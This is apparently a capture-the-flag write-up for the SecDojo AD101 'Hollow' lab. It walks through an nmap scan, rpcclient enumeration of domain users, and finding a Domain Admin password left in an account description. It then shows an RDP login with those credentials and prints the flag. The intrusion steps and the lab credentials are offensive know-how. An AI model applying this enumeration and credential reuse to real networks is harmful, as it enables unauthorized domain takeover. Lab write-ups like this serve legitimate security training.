---
title: "SecDojo - AD101 Lab"
author: [Sesco]
subtitle: "Hollow machine write up"
date: "2023-01-01"
keywords: [Windows, Security, CTF, Hacking]
lang: "en"
titlepage: true
titlepage-text-color: "FFFFFF"
titlepage-color: "243763"
titlepage-rule-color: "8ac53e"
...


# Information

- **Name:** AD101 Lab - Hollow Machine
- **Profile:** SecDojo
- **Difficulty:** Easy
- **Description:** This lab serves as an environment to get you up and running with many aspects of Active Directory security. You will have access as a regular domain user and you will walk your way through all the misconfigurations in the domain environment. You are encouraged to detect as many vulnerabilities as you can. Some vulnerabilities will grant you Domain Admin access directly, others need to be combined to take over the domain. For this Lab you are given the following credentials : Username : LAB\student Password : hsxGs_72$


# Enumeration

## Nmap

We begin our reconnaissance by running an Nmap scan checking services and their versions also checking default scripts and testing for vulnerabilities.

```console
nmap -sV -sC -Pn -oA Hollow -T4 10.8.0.2
Starting Nmap 7.80 ( https://nmap.org ) at 2022-12-31 13:57 +01
Stats: 0:01:35 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 92.31% done; ETC: 13:59 (0:00:07 remaining)
Nmap scan report for 10.8.0.2
Host is up (0.16s latency).
Not shown: 987 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-12-31 12:57:50Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: lab.abcit.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: LAB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: lab.abcit.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: LAB
|   NetBIOS_Domain_Name: LAB
|   NetBIOS_Computer_Name: HOLLOW
|   DNS_Domain_Name: lab.abcit.local
|   DNS_Computer_Name: Hollow.lab.abcit.local
|   DNS_Tree_Name: lab.abcit.local
|   Product_Version: 10.0.14393
|_  System_Time: 2022-12-31T13:00:15+00:00
| ssl-cert: Subject: commonName=Hollow.lab.abcit.local
| Not valid before: 2022-12-30T12:45:16
|_Not valid after:  2023-07-01T12:45:16
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=12/31%Time=63B031D3%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
Service Info: Host: HOLLOW; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_nbstat: NetBIOS name: HOLLOW, NetBIOS user: <unknown>, NetBIOS MAC: 00:ff:4a:36:5e:35 (unknown)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-12-31T13:00:15
|_  start_date: 2022-12-31T12:45:25

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 327.10 seconds
```

## Rpcclient

Since I have a domain user's credentials I started enumerating with rpcclient tool.

![](./Figure%201.png)

I tried to find available uesrs and this is the result.

```console
rpcclient $> enumdomusers 
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[web-service] rid:[0x456]
user:[backup] rid:[0x457]
user:[student] rid:[0x458]
user:[test_av] rid:[0x459]
user:[svc_mssql] rid:[0x460]
```

Also I looked for available groups.

```console
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x455]
```

After that I went and tried to query informations of those users using their RIDs and found something interesting about the user **test_av**.

```console
rpcclient $> queryuser 0x459
	User Name   :	test_av
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	test account for AV integration pass antivirus123!
```

He kept his password within description field **antivirus123!**.

Just to make sure I tried to find groups that our user is belonging to, and found one of the group's RID `0x200` match Domain Admins group which means **test_av** is belonging to an admin group and so he has admin privileges.

```console
rpcclient $> queryusergroups 0x459
	group rid:[0x201] attr:[0x7]
	group rid:[0x200] attr:[0x7]
```

# Exploitation

I tried to connect remotely to the machine using rdesktop tool.

```console
rdesktop -g 100% -r clipboard:CLIPBOARD -d LAB -u test_av -p antivirus123! 10.8.0.2
```

Password change was required and so I did.

![](Figure%202.png)

## Root Flag

Navigating to the Administrator Desktop and there was our flag.

![](./Figure%203.png)

**Flag:** **`Hollow_Sesco-7zx60ll8d5vqdzggqup77rckil8flkb8`**